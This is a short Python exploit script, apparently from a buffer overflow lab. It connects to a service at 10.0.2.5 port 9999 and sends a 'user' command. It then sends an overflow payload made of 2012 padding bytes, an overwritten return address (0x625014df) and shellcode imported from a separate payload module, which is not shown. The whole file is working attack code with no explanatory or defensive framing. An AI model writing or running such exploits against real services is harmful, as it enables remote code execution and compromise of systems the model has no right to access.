import socket
import struct 
from payload import buf

server_ip = "10.0.2.5"
server_port = 9999
pattern_offset = 2012
eip = 0x625014df

payload = b"A" * pattern_offset + struct.pack("<I", eip) + buf

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

client.connect((server_ip, server_port))

response = b''
for i in range(2):
    response += client.recv(1024)

print(response)

client.send(b"user\r\n")

response = client.recv(1024)

print(response)

client.send(payload + b"\r\n")

client.close()